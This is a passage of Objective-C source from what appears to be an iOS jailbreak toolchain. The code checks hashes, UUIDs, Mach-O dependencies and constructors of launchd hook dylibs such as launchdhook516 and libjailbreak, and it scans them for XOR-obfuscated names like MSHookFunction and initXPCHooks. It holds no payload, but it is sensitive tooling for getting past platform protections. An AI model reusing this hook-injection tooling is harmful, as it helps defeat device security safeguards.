    if (!text.length)
        return @"";
    NSString *prefix = [key stringByAppendingString:@"="];
    for (NSString *line in [text componentsSeparatedByString:@"\n"]) {
        if ([line hasPrefix:prefix])
            return [line substringFromIndex:prefix.length];
    }
    return @"";
}

static BOOL dt102734c_string_equals_cstr(NSString *actual, const char *expected)
{
    if (!actual.length || !expected)
        return NO;
    return [actual isEqualToString:[NSString stringWithUTF8String:expected]];
}

static int dt102734c_verify_bundle_resource_identity(void)
{
    NSString *bundlePath = [NSBundle mainBundle].bundlePath ?: @"UNAVAILABLE";
    NSString *version = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleVersion"] ?: @"";
    NSString *manifest = dt102734c_bundle_artifact_path(@"BUILD102734C_RESOURCE_MANIFEST.txt");
    BOOL manifestPresent = [[NSFileManager defaultManager] fileExistsAtPath:manifest];

    NSString *hookSha = dt699_sha256_path(dt102734c_bundle_artifact_path(@"launchdhook516.dylib"));
    NSString *ljSha = dt699_sha256_path(dt102734c_bundle_artifact_path(@"libjailbreak.dylib"));
    NSString *lcSha = dt699_sha256_path(dt102734c_bundle_artifact_path(@"libchoma.dylib"));

    BOOL versionOk = dt102734c_string_equals_cstr(version, kDT102734CExpectedCFBundleVersion);
    BOOL manifestOk = manifestPresent
        && dt102734c_string_equals_cstr(dt102734c_manifest_value(@"CFBundleVersion"),
            kDT102734CExpectedCFBundleVersion)
        && dt102734c_string_equals_cstr(dt102734c_manifest_value(@"launchdhook516.dylib"),
            kDT102734CExpectedLaunchdhookSHA256)
        && dt102734c_string_equals_cstr(dt102734c_manifest_value(@"libjailbreak.dylib"),
            kDT102734CExpectedLibjailbreakSHA256)
        && dt102734c_string_equals_cstr(dt102734c_manifest_value(@"libchoma.dylib"),
            kDT102734CExpectedLibchomaSHA256);
    BOOL packageHashMatch = dt102734c_string_equals_cstr(hookSha, kDT102734CExpectedLaunchdhookSHA256)
        && dt102734c_string_equals_cstr(ljSha, kDT102734CExpectedLibjailbreakSHA256)
        && dt102734c_string_equals_cstr(lcSha, kDT102734CExpectedLibchomaSHA256);
    BOOL pass = versionOk && manifestOk;

    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_RUNNING_BUNDLE_PATH=%@",
        bundlePath] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_RUNNING_CF_BUNDLE_VERSION=%@",
        version.length ? version : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_BUNDLE_MANIFEST_PRESENT=%@",
        manifestPresent ? @"YES" : @"NO"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_BUNDLE_LAUNCHDHOOK_SHA256=%@",
        hookSha.length ? hookSha : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_BUNDLE_LIBJAILBREAK_SHA256=%@",
        ljSha.length ? ljSha : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_BUNDLE_LIBCHOMA_SHA256=%@",
        lcSha.length ? lcSha : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_BUNDLE_FILE_SHA_POLICY=%@",
        @"REPORT_ONLY_INSTALLED_BUNDLE_CAN_DRIFT"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_BUNDLE_FILE_SHA_MATCHES_MANIFEST=%@",
        packageHashMatch ? @"YES" : @"NO"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_BUNDLE_RESOURCE_IDENTITY=%@",
        pass ? @"PASS" : @"FAIL"] UTF8String]);
    return pass ? 0 : -1;
}

static int dt102734c_verify_stage_copy_identity(void)
{
    NSString *hookSha = dt699_sha256_path(dt710_resolve_hook_path());
    NSString *ljSha = dt699_sha256_path(dt710_resolve_libjailbreak_path());
    NSString *lcSha = dt699_sha256_path(dt710_resolve_libchoma_path());
    NSString *bundleHookSha = dt699_sha256_path(dt102734c_bundle_artifact_path(@"launchdhook516.dylib"));
    NSString *bundleLjSha = dt699_sha256_path(dt102734c_bundle_artifact_path(@"libjailbreak.dylib"));
    NSString *bundleLcSha = dt699_sha256_path(dt102734c_bundle_artifact_path(@"libchoma.dylib"));

    BOOL pass = hookSha.length && ljSha.length && lcSha.length
        && [hookSha isEqualToString:bundleHookSha]
        && [ljSha isEqualToString:bundleLjSha]
        && [lcSha isEqualToString:bundleLcSha];

    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_STAGED_PRESIGN_LAUNCHDHOOK_SHA256=%@",
        hookSha.length ? hookSha : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_STAGED_PRESIGN_LIBJAILBREAK_SHA256=%@",
        ljSha.length ? ljSha : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_STAGED_PRESIGN_LIBCHOMA_SHA256=%@",
        lcSha.length ? lcSha : @"UNAVAILABLE"] UTF8String]);
    dt699_stage("BUILD102734C_STAGE_COPY_COMPARE=BUNDLE_TO_STAGED_PRESIGN");
    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_STAGE_COPY_IDENTITY=%@",
        pass ? @"PASS" : @"FAIL"] UTF8String]);
    return pass ? 0 : -1;
}

#if defined(DT_ROOTLESS_R24)
/* D0: canonical Mach-O identity (+ UUID) must match pins; raw SHA is forensic only. */
static NSString *dt_r24_canonical_hex_path(NSString *path, int *rcOut)
{
    if (rcOut)
        *rcOut = -1;
    if (!path.length)
        return nil;
    char hex[72];
    memset(hex, 0, sizeof(hex));
    int rc = dt_macho_canonical_sha256_hex(path.fileSystemRepresentation, hex, sizeof(hex));
    if (rcOut)
        *rcOut = rc;
    if (rc != 0)
        return nil;
    return [NSString stringWithUTF8String:hex];
}

static NSString *dt_r24_uuid_path(NSString *path)
{
    if (!path.length)
        return nil;
    char uuid[48];
    memset(uuid, 0, sizeof(uuid));
    if (dt_macho_uuid_string(path.fileSystemRepresentation, uuid, sizeof(uuid)) != 0)
        return nil;
    return [NSString stringWithUTF8String:uuid];
}

static int dt_r24_verify_d0_handoff_identity(void)
{
    NSString *expectHook = @ROOTLESS_R24_EXPECT_HOOK_CANONICAL_SHA256_HEX;
    NSString *expectSh = @ROOTLESS_R24_EXPECT_SYSTEMHOOK_CANONICAL_SHA256_HEX;
    NSString *expectHookUuid = @ROOTLESS_R24_EXPECT_HOOK_UUID_STR;
    NSString *expectShUuid = @ROOTLESS_R24_EXPECT_SYSTEMHOOK_UUID_STR;

    NSString *bundleHookPath = dt102734c_bundle_artifact_path(@"launchdhook516.dylib");
    NSString *bundleShPath = dt102734c_bundle_artifact_path(@"systemhook.dylib");
    NSString *stagedHookPath = dt710_resolve_hook_path();
    NSString *stagedShPath = dt710_resolve_systemhook_path();

    int bundleHookCanonRC = -1, stagedHookCanonRC = -1;
    int bundleShCanonRC = -1, stagedShCanonRC = -1;
    NSString *bundleHookCanon = dt_r24_canonical_hex_path(bundleHookPath, &bundleHookCanonRC);
    NSString *stagedHookCanon = dt_r24_canonical_hex_path(stagedHookPath, &stagedHookCanonRC);
    NSString *bundleShCanon = dt_r24_canonical_hex_path(bundleShPath, &bundleShCanonRC);
    NSString *stagedShCanon = dt_r24_canonical_hex_path(stagedShPath, &stagedShCanonRC);
    NSString *bundleHookUuid = dt_r24_uuid_path(bundleHookPath);
    NSString *stagedHookUuid = dt_r24_uuid_path(stagedHookPath);
    NSString *bundleShUuid = dt_r24_uuid_path(bundleShPath);
    NSString *stagedShUuid = dt_r24_uuid_path(stagedShPath);

    /* Forensic whole-file SHA (expected RAW_MATCH=NO after TrollStore). */
    NSString *bundleHookRaw = dt699_sha256_path(bundleHookPath);
    NSString *stagedHookRaw = dt699_sha256_path(stagedHookPath);
    NSString *bundleShRaw = dt699_sha256_path(bundleShPath);
    NSString *stagedShRaw = dt699_sha256_path(stagedShPath);

    dt699_stage(kRootlessR24D0IdentityKind);
    dt699_stage(kRootlessR24D0CanonicalPolicy);
    dt699_stage(kRootlessR24ExpectHookCanonPin);
    dt699_stage(kRootlessR24ExpectSystemhookCanonPin);
    dt699_stage(kRootlessR24ExpectHookUuidPin);
    dt699_stage(kRootlessR24ExpectSystemhookUuidPin);

    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_BUNDLE_HOOK_CANONICAL_SHA256=%@",
        bundleHookCanon.length ? bundleHookCanon : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_STAGED_HOOK_CANONICAL_SHA256=%@",
        stagedHookCanon.length ? stagedHookCanon : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_BUNDLE_SYSTEMHOOK_CANONICAL_SHA256=%@",
        bundleShCanon.length ? bundleShCanon : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_STAGED_SYSTEMHOOK_CANONICAL_SHA256=%@",
        stagedShCanon.length ? stagedShCanon : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_BUNDLE_HOOK_CANONICAL_RC=%d",
        bundleHookCanonRC] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_STAGED_HOOK_CANONICAL_RC=%d",
        stagedHookCanonRC] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_BUNDLE_SYSTEMHOOK_CANONICAL_RC=%d",
        bundleShCanonRC] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_STAGED_SYSTEMHOOK_CANONICAL_RC=%d",
        stagedShCanonRC] UTF8String]);

    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_BUNDLE_HOOK_UUID=%@",
        bundleHookUuid.length ? bundleHookUuid : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_STAGED_HOOK_UUID=%@",
        stagedHookUuid.length ? stagedHookUuid : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_BUNDLE_SYSTEMHOOK_UUID=%@",
        bundleShUuid.length ? bundleShUuid : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_STAGED_SYSTEMHOOK_UUID=%@",
        stagedShUuid.length ? stagedShUuid : @"UNAVAILABLE"] UTF8String]);

    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_BUNDLE_HOOK_RAW_SHA256=%@",
        bundleHookRaw.length ? bundleHookRaw : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_STAGED_HOOK_RAW_SHA256=%@",
        stagedHookRaw.length ? stagedHookRaw : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_BUNDLE_SYSTEMHOOK_RAW_SHA256=%@",
        bundleShRaw.length ? bundleShRaw : @"UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_STAGED_SYSTEMHOOK_RAW_SHA256=%@",
        stagedShRaw.length ? stagedShRaw : @"UNAVAILABLE"] UTF8String]);

    BOOL hookCanonOk = stagedHookCanon.length > 0
        && [stagedHookCanon isEqualToString:bundleHookCanon]
        && [stagedHookCanon isEqualToString:expectHook];
    BOOL shCanonOk = stagedShCanon.length > 0
        && [stagedShCanon isEqualToString:bundleShCanon]
        && [stagedShCanon isEqualToString:expectSh];
    BOOL hookUuidOk = stagedHookUuid.length > 0
        && [stagedHookUuid isEqualToString:bundleHookUuid]
        && [stagedHookUuid isEqualToString:expectHookUuid];
    BOOL shUuidOk = stagedShUuid.length > 0
        && [stagedShUuid isEqualToString:bundleShUuid]
        && [stagedShUuid isEqualToString:expectShUuid];
    /* Staging integrity at pre-sign boundary: raw copy must match. */
    BOOL hookStageRawOk = stagedHookRaw.length > 0 && [stagedHookRaw isEqualToString:bundleHookRaw];
    BOOL shStageRawOk = stagedShRaw.length > 0 && [stagedShRaw isEqualToString:bundleShRaw];
    BOOL pass = hookCanonOk && shCanonOk && hookUuidOk && shUuidOk && hookStageRawOk && shStageRawOk;

    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_HOOK_CANONICAL_MATCH=%@",
        hookCanonOk ? @"YES" : @"NO"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_SYSTEMHOOK_CANONICAL_MATCH=%@",
        shCanonOk ? @"YES" : @"NO"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_HOOK_UUID_MATCH=%@",
        hookUuidOk ? @"YES" : @"NO"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_SYSTEMHOOK_UUID_MATCH=%@",
        shUuidOk ? @"YES" : @"NO"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_HOOK_STAGE_RAW_MATCH=%@",
        hookStageRawOk ? @"YES" : @"NO"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_D0_SYSTEMHOOK_STAGE_RAW_MATCH=%@",
        shStageRawOk ? @"YES" : @"NO"] UTF8String]);
    if (!pass) {
        dt699_stage(kRootlessR24D0GateFail);
        dt699_stage("ROOTLESS_R24_D0_IDENTITY=FAIL");
        return -1;
    }
    dt699_stage(kRootlessR24D0Pass);
    return 0;
}
#endif

static void dt102732c_emit_no_mutation_markers(void)
{
    dt699_stage("BUILD102732C_GOT_ACCESSED=NO");
    dt699_stage("BUILD102732C_GOT_POINTER_READ=NO");
    dt699_stage("BUILD102732C_GOT_POINTER_WRITTEN=NO");
    dt699_stage("BUILD102732C_LAUNCHD_PROTECTION_CHANGED=NO");
    dt699_stage("BUILD102732C_MACH_VM_PROTECT_GOT_CALLED=NO");
    dt699_stage("BUILD102732C_XPC_HOOK_INSTALLED=NO");
    dt699_stage("BUILD102732C_INITXPCHOOKS_CALLED=NO");
    dt699_stage("BUILD102732C_MSHOOKFUNCTION_CALLED=NO");
    dt699_stage("BUILD102732C_STAGE_B_ACTIVE=NO");
    dt699_stage("BUILD102732C_STAGE_C_ACTIVE=NO");
}

static BOOL dt102732c_data_contains_ascii(NSData *data, const char *needle)
{
    if (!data.length || !needle || !needle[0])
        return NO;
    const uint8_t *bytes = data.bytes;
    size_t len = data.length;
    size_t nlen = strlen(needle);
    if (nlen > len)
        return NO;
    for (size_t i = 0; i + nlen <= len; i++) {
        if (memcmp(bytes + i, needle, nlen) == 0)
            return YES;
    }
    return NO;
}

static BOOL dt102732c_file_contains_ascii(NSString *path, const char *needle)
{
    NSData *data = [NSData dataWithContentsOfFile:path];
    return dt102732c_data_contains_ascii(data, needle);
}

static void dt102732c_decode_needle(char *out, size_t out_len, const uint8_t *encoded,
    size_t encoded_len)
{
    if (!out || !out_len)
        return;
    size_t n = encoded_len < out_len - 1 ? encoded_len : out_len - 1;
    for (size_t i = 0; i < n; i++)
        out[i] = (char)(encoded[i] ^ 0x5a);
    out[n] = 0;
}

static BOOL dt102732c_macho_each_load_name(NSString *path, BOOL (^visitor)(const char *name))
{
    NSData *data = [NSData dataWithContentsOfFile:path];
    if (data.length < sizeof(struct mach_header_64))
        return NO;
    const uint8_t *bytes = data.bytes;
    NSUInteger len = data.length;
    const struct mach_header_64 *mh = (const struct mach_header_64 *)bytes;
    if (mh->magic != MH_MAGIC_64)
        return NO;
    uint64_t off = sizeof(struct mach_header_64);
    for (uint32_t i = 0; i < mh->ncmds; i++) {
        if (off + sizeof(struct load_command) > len)
            return NO;
        const struct load_command *lc = (const struct load_command *)(bytes + off);
        if (lc->cmdsize < sizeof(struct load_command) || off + lc->cmdsize > len)
            return NO;
        if (lc->cmd == LC_LOAD_DYLIB || lc->cmd == LC_LOAD_WEAK_DYLIB
            || lc->cmd == LC_REEXPORT_DYLIB || lc->cmd == LC_LOAD_UPWARD_DYLIB) {
            if (lc->cmdsize < sizeof(struct dylib_command))
                return NO;
            const struct dylib_command *dc = (const struct dylib_command *)lc;
            if (dc->dylib.name.offset >= lc->cmdsize)
                return NO;
            const char *name = (const char *)(bytes + off + dc->dylib.name.offset);
            size_t max_len = lc->cmdsize - dc->dylib.name.offset;
            if (!memchr(name, 0, max_len))
                return NO;
            if (visitor && !visitor(name))
                return NO;
        }
        off += lc->cmdsize;
    }
    return YES;
}

static BOOL dt102732c_macho_loads_dylib(NSString *path, const char *expected)
{
    __block BOOL found = NO;
    BOOL ok = dt102732c_macho_each_load_name(path, ^BOOL(const char *name) {
        if (strcmp(name, expected) == 0)
            found = YES;
        return YES;
    });
    return ok && found;
}

static BOOL dt102732c_macho_loads_only_system_libraries(NSString *path)
{
    __block BOOL only_system = YES;
    BOOL ok = dt102732c_macho_each_load_name(path, ^BOOL(const char *name) {
        if (strncmp(name, "/usr/lib/", 9) == 0
            || strncmp(name, "/System/Library/", 16) == 0) {
            return YES;
        }
        only_system = NO;
        return YES;
    });
    return ok && only_system;
}

static BOOL dt102732c_macho_range_in_bounds(uint64_t off, uint64_t size, uint64_t len)
{
    return off <= len && size <= len - off;
}

static BOOL dt102732c_macho_add_unique_target(uint64_t *targets, uint32_t *count, uint64_t target)
{
    if (!targets || !count)
        return NO;
    for (uint32_t i = 0; i < *count; i++) {
        if (targets[i] == target)
            return YES;
    }
    if (*count >= 64)
        return NO;
    targets[*count] = target;
    (*count)++;
    return YES;
}

static BOOL dt102732c_macho_resolve_init_offset(const dt102732c_macho_segment_t *segments,
    uint32_t segment_count, uint64_t image_base, uint64_t len, uint32_t raw_offset,
    uint64_t *targetOut)
{
    if (image_base > UINT64_MAX - raw_offset)
        return NO;
    uint64_t target = image_base + raw_offset;
    for (uint32_t i = 0; i < segment_count; i++) {
        const dt102732c_macho_segment_t *seg = &segments[i];
        if (!(seg->initprot & VM_PROT_EXECUTE))
            continue;
        if (seg->vmsize == 0 || target < seg->vmaddr)
            continue;
        uint64_t delta = target - seg->vmaddr;
        if (delta >= seg->vmsize)
            continue;
        if (delta >= seg->filesize)
            return NO;
        if (!dt102732c_macho_range_in_bounds(seg->fileoff, seg->filesize, len))
            return NO;
        if (seg->fileoff > UINT64_MAX - delta || seg->fileoff + delta >= len)
            return NO;
        if (targetOut)
            *targetOut = target;
        return YES;
    }
    return NO;
}

static const char *dt102732c_constructor_representation(const dt102732c_constructor_audit_t *audit)
{
    if (!audit)
        return "NONE";
    if (audit->has_mod_init && audit->has_init_offsets)
        return "BOTH";
    if (audit->has_mod_init)
        return "MOD_INIT_FUNC";
    if (audit->has_init_offsets)
        return "INIT_OFFSETS";
    return "NONE";
}

static uint32_t dt102732c_macho_logical_constructor_count(NSString *path,
    dt102732c_constructor_audit_t *auditOut)
{
    NSData *data = [NSData dataWithContentsOfFile:path];
    dt102732c_constructor_audit_t audit = {0};
    audit.valid = NO;
    if (data.length < sizeof(struct mach_header_64)) {
        if (auditOut)
            *auditOut = audit;
        return UINT32_MAX;
    }
    const uint8_t *bytes = data.bytes;
    uint64_t len = (uint64_t)data.length;
    const struct mach_header_64 *mh = (const struct mach_header_64 *)bytes;
    if (mh->magic != MH_MAGIC_64) {
        if (auditOut)
            *auditOut = audit;
        return UINT32_MAX;
    }

    dt102732c_macho_segment_t segments[64] = {0};
    uint32_t segment_count = 0;
    uint64_t image_base = UINT64_MAX;
    uint64_t off = sizeof(struct mach_header_64);
    for (uint32_t i = 0; i < mh->ncmds; i++) {
        if (!dt102732c_macho_range_in_bounds(off, sizeof(struct load_command), len)) {
            if (auditOut)
                *auditOut = audit;
            return UINT32_MAX;
        }
        const struct load_command *lc = (const struct load_command *)(bytes + off);
        if (lc->cmdsize < sizeof(struct load_command)
            || !dt102732c_macho_range_in_bounds(off, lc->cmdsize, len)) {
            if (auditOut)
                *auditOut = audit;
            return UINT32_MAX;
        }
        if (lc->cmd == LC_SEGMENT_64 && lc->cmdsize >= sizeof(struct segment_command_64)) {
            const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
            if (seg->nsects > (UINT32_MAX / sizeof(struct section_64))) {
                if (auditOut)
                    *auditOut = audit;
                return UINT32_MAX;
            }
            uint64_t section_table_size = (uint64_t)seg->nsects * sizeof(struct section_64);
            if (sizeof(struct segment_command_64) > lc->cmdsize
                || section_table_size > lc->cmdsize - sizeof(struct segment_command_64)) {
                if (auditOut)
                    *auditOut = audit;
                return UINT32_MAX;
            }
            if (segment_count >= 64) {
                if (auditOut)
                    *auditOut = audit;
                return UINT32_MAX;
            }
            segments[segment_count++] = (dt102732c_macho_segment_t){
                .vmaddr = seg->vmaddr,
                .vmsize = seg->vmsize,
                .fileoff = seg->fileoff,
                .filesize = seg->filesize,
                .initprot = seg->initprot,
            };
            if (seg->fileoff == 0 && image_base == UINT64_MAX)
                image_base = seg->vmaddr;
        }
        off += lc->cmdsize;
    }
    if (image_base == UINT64_MAX)
        image_base = 0;

    uint64_t logical_targets[64] = {0};
    off = sizeof(struct mach_header_64);
    audit.valid = YES;
    for (uint32_t i = 0; i < mh->ncmds; i++) {
        const struct load_command *lc = (const struct load_command *)(bytes + off);
        if (lc->cmd == LC_SEGMENT_64 && lc->cmdsize >= sizeof(struct segment_command_64)) {
            const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
            uint64_t sect_off = off + sizeof(struct segment_command_64);
            for (uint32_t s = 0; s < seg->nsects; s++) {
                const struct section_64 *sect = (const struct section_64 *)(bytes + sect_off);
                if (strncmp(sect->sectname, "__mod_init_func", sizeof(sect->sectname)) == 0) {
                    audit.has_mod_init = YES;
                    if ((sect->size % sizeof(uint64_t)) != 0
                        || !dt102732c_macho_range_in_bounds(sect->offset, sect->size, len)) {
                        audit.valid = NO;
                        break;
                    }
                    uint64_t entries = sect->size / sizeof(uint64_t);
                    if (entries > UINT32_MAX - audit.mod_init_count) {
                        audit.valid = NO;
                        break;
                    }
                    audit.mod_init_count += (uint32_t)entries;
                    for (uint64_t j = 0; j < entries; j++) {
                        uint64_t target = 0;
                        memcpy(&target, bytes + sect->offset + (j * sizeof(uint64_t)), sizeof(target));
                        if (!dt102732c_macho_add_unique_target(logical_targets,
                                &audit.logical_count, target)) {
                            audit.valid = NO;
                            break;
                        }
                    }
                } else if (strncmp(sect->sectname, "__init_offsets", sizeof(sect->sectname)) == 0) {
                    audit.has_init_offsets = YES;
                    if ((sect->size % sizeof(uint32_t)) != 0
                        || !dt102732c_macho_range_in_bounds(sect->offset, sect->size, len)) {
                        audit.valid = NO;
                        break;
                    }
                    uint64_t entries = sect->size / sizeof(uint32_t);
                    if (entries > UINT32_MAX - audit.init_offsets_count) {
                        audit.valid = NO;
                        break;
                    }
                    audit.init_offsets_count += (uint32_t)entries;
                    for (uint64_t j = 0; j < entries; j++) {
                        uint32_t raw_offset = 0;
                        uint64_t entry_off = sect->offset + (j * sizeof(uint32_t));
                        memcpy(&raw_offset, bytes + entry_off, sizeof(raw_offset));
                        uint64_t target = 0;
                        if (!dt102732c_macho_resolve_init_offset(segments, segment_count,
                                image_base, len, raw_offset, &target)
                            || !dt102732c_macho_add_unique_target(logical_targets,
                                &audit.logical_count, target)) {
                            audit.valid = NO;
                            break;
                        }
                    }
                }
                if (!audit.valid)
                    break;
                sect_off += sizeof(struct section_64);
            }
        }
        if (!audit.valid)
            break;
        off += lc->cmdsize;
    }
    if (!audit.valid)
        audit.logical_count = UINT32_MAX;
    if (auditOut)
        *auditOut = audit;
    return audit.logical_count;
}

static int dt102732c_dependency_gate(dt102732c_artifact_t *artifacts)
{
    NSString *hook = artifacts[0].path;
    NSString *lj = artifacts[1].path;
    NSString *lc = artifacts[2].path;
    BOOL hook_load = dt102732c_macho_loads_dylib(hook, "@loader_path/libjailbreak.dylib");
    BOOL lj_load = dt102732c_macho_loads_dylib(lj, "@loader_path/libchoma.dylib");
    BOOL lc_system = dt102732c_macho_loads_only_system_libraries(lc);
    BOOL mshook = NO;
    BOOL initxpc = NO;
    BOOL full_jbserver = NO;
    static const uint8_t kMshookEncoded[] = {
        0x17, 0x09, 0x12, 0x35, 0x35, 0x31, 0x1c, 0x2f,
        0x34, 0x39, 0x2e, 0x33, 0x35, 0x34
    };
    static const uint8_t kInitXpcEncoded[] = {
        0x33, 0x34, 0x33, 0x2e, 0x02, 0x0a, 0x19, 0x12,
        0x35, 0x35, 0x31, 0x29
    };
    static const uint8_t kJbserverReceivedEncoded[] = {
        0x30, 0x38, 0x29, 0x3f, 0x28, 0x2c, 0x3f, 0x28,
        0x05, 0x28, 0x3f, 0x39, 0x3f, 0x33, 0x2c, 0x3f,
        0x3e, 0x05
    };
    char mshookNeedle[32] = {0};
    char initxpcNeedle[32] = {0};
    char fullJbserverNeedle[32] = {0};
    dt102732c_decode_needle(mshookNeedle, sizeof(mshookNeedle),
        kMshookEncoded, sizeof(kMshookEncoded));
    dt102732c_decode_needle(initxpcNeedle, sizeof(initxpcNeedle),
        kInitXpcEncoded, sizeof(kInitXpcEncoded));
    dt102732c_decode_needle(fullJbserverNeedle, sizeof(fullJbserverNeedle),
        kJbserverReceivedEncoded, sizeof(kJbserverReceivedEncoded));
    for (size_t i = 0; i < 3; i++) {
        mshook |= dt102732c_file_contains_ascii(artifacts[i].path, mshookNeedle);
        initxpc |= dt102732c_file_contains_ascii(artifacts[i].path, initxpcNeedle);
        full_jbserver |= dt102732c_file_contains_ascii(artifacts[i].path, fullJbserverNeedle);
        full_jbserver |= dt102732c_file_contains_ascii(artifacts[i].path, initxpcNeedle);
    }
    dt102732c_constructor_audit_t ctor_audit = {0};
    uint32_t ctor_count = dt102732c_macho_logical_constructor_count(hook, &ctor_audit);
#ifdef DT_ROOTLESS_R4
    /*
     * R6/R7 fuller hook (ROOTLESS_R6_FULLER_HOOK): Gate1B1 minimal invariants are STALE.
     * Real-device DEPENDENCY_GATE_FAIL proved fuller has INIT_OFFSETS×2 + jbserver surface.
     * Pre-R24: keep substrate/XPC-hook ABSENCE checks.
     * R24 CBR: invert — require initXPCHooks + MSHookFunction needle (litehook shim name)
     * present; still REQUIRE fuller jbserver + dual constructors.
     */
    BOOL ctor_rep_ok = ctor_audit.has_init_offsets
        && !ctor_audit.has_mod_init
        && strcmp(dt102732c_constructor_representation(&ctor_audit), "INIT_OFFSETS") == 0;
    BOOL ctor_valid = ctor_audit.valid && ctor_count == 2 && ctor_rep_ok;
    BOOL has_main_ctor_marker =
        dt102732c_file_contains_ascii(hook, "GATE1B_LAUNCHDHOOK_CONSTRUCTOR_ENTERED")
        || dt102732c_file_contains_ascii(hook, "BUILD102732C_HOOK_CONSTRUCTOR_ENTERED=YES");
    BOOL has_jbserver_mach =
        dt102732c_file_contains_ascii(hook, "jbserver_received_mach_message");
    BOOL has_dual_sandbox =
        dt102732c_file_contains_ascii(hook, "/private/var/jb")
        && dt102732c_file_contains_ascii(hook, "/var/jb");
    BOOL has_boomerang =
        dt102732c_file_contains_ascii(hook, "boomerang_recoverPrimitives516")
        || dt102732c_file_contains_ascii(hook, "GATE1B_LAUNCHDHOOK_BOOMERANG_RECOVER");
    BOOL fuller_surface_ok = full_jbserver && has_jbserver_mach && has_main_ctor_marker
        && has_dual_sandbox && has_boomerang;
#if defined(DT_ROOTLESS_R24)
    BOOL cbr_surface_present = initxpc && mshook;
    BOOL deps_graph_ok = hook_load && lj_load && lc_system && cbr_surface_present
        && fuller_surface_ok;
    BOOL pass = deps_graph_ok && ctor_valid;
    dt699_stage("ROOTLESS_R24_DEP_GATE_CBR_SURFACE_REQUIRED=YES");
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R24_DEP_GATE_CBR_SURFACE_PRESENT=%@",
        cbr_surface_present ? @"YES" : @"NO"] UTF8String]);
    dt699_stage("ROOTLESS_R7_HOOK_DEP_GATE_BEGIN");
    dt699_stage("ROOTLESS_R7_HOOK_STAGE_IDENTITY_OK=ROOTLESS_R24_CBR_HOOK");
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R7_CONSTRUCTORS_OK=%@",
        ctor_valid ? @"YES" : @"NO"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R7_DEPENDENCIES_OK=%@",
        deps_graph_ok ? @"YES" : @"NO"] UTF8String]);
#else
    BOOL substrate_absent = !mshook && !initxpc;
    BOOL deps_graph_ok = hook_load && lj_load && lc_system && substrate_absent
        && fuller_surface_ok;
    BOOL pass = deps_graph_ok && ctor_valid;
    dt699_stage("ROOTLESS_R7_HOOK_DEP_GATE_BEGIN");
    dt699_stage("ROOTLESS_R7_HOOK_STAGE_IDENTITY_OK=ROOTLESS_R6_FULLER_HOOK");
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R7_CONSTRUCTORS_OK=%@",
        ctor_valid ? @"YES" : @"NO"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R7_DEPENDENCIES_OK=%@",
        deps_graph_ok ? @"YES" : @"NO"] UTF8String]);
#endif
#else
    /* Legacy Gate1B1 GOT-protection-only: exactly one ctor, no fuller jbserver surface. */
    BOOL ctor_valid = ctor_audit.valid && ctor_count == 1;
    BOOL pass = hook_load && lj_load && lc_system && !mshook && !initxpc && !full_jbserver
        && ctor_valid;
#endif
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_MOD_INIT_FUNC_COUNT=%u",
        ctor_audit.mod_init_count] UTF8String]);
